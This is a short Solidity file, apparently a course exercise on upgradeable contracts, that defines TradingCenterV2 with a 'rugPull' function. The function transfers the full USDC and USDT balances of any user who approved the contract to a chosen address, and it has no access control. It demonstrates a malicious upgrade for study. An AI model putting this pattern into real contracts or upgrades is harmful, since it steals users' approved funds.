// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;
import { TradingCenter } from "./TradingCenter.sol";
// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter{
    function rugPull(address user, address owner) external {
        usdc.transferFrom(user, owner, usdc.balanceOf(user));
        usdt.transferFrom(user, owner, usdt.balanceOf(user));
    }
}